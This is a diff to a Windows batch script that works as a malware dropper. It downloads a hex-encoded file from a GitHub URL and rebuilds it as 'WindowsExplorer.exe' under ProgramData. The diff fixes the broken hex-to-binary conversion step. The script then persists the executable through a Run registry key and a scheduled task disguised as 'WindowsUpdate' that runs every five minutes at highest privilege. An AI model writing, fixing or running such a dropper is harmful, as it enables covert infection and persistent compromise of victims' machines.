@@ -31,7 +31,10 @@ echo ----------------------------download-hex-file------------------------------
 PowerShell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/main/WindowsExplorer.txt','%programdata%\GG-Win\WindowsExplorer.txt')"
 echo ----------------------convert-hex-to-exe-----------------------------------------
 PowerShell.exe -Command "Get-Content '%programdata%\GG-Win\WindowsExplorer.txt' | ForEach-Object { $_ -replace '[^0-9A-Fa-f]', '' } | Out-File '%programdata%\GG-Win\clean_hex.txt' -Encoding ASCII"
-PowerShell.exe -Command "$hex = Get-Content '%programdata%\GG-Win\clean_hex.txt' -Raw; $bytes = -join ($hex -split '(.{2})' | Where-Object { $_ -ne '' } | ForEach-Object { [char][byte]('0x' + $_) }); [System.IO.File]::WriteAllBytes('%programdata%\GG-Win\WindowsExplorer.exe', [System.Text.Encoding]::ASCII.GetBytes($bytes))"
+PowerShell.exe -Command ^
+"$hex = Get-Content '%programdata%\GG-Win\clean_hex.txt' -Raw; ^
+$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [Convert]::ToByte($hex.Substring($i,2),16) }; ^
+[IO.File]::WriteAllBytes('%programdata%\GG-Win\WindowsExplorer.exe', $bytes)"
 echo -----------start-payload------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\WindowsExplorer.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc minute /mo 5 /RL HIGHEST /tr "%ProgramData%\GG-Win\WindowsExplorer.exe" /f
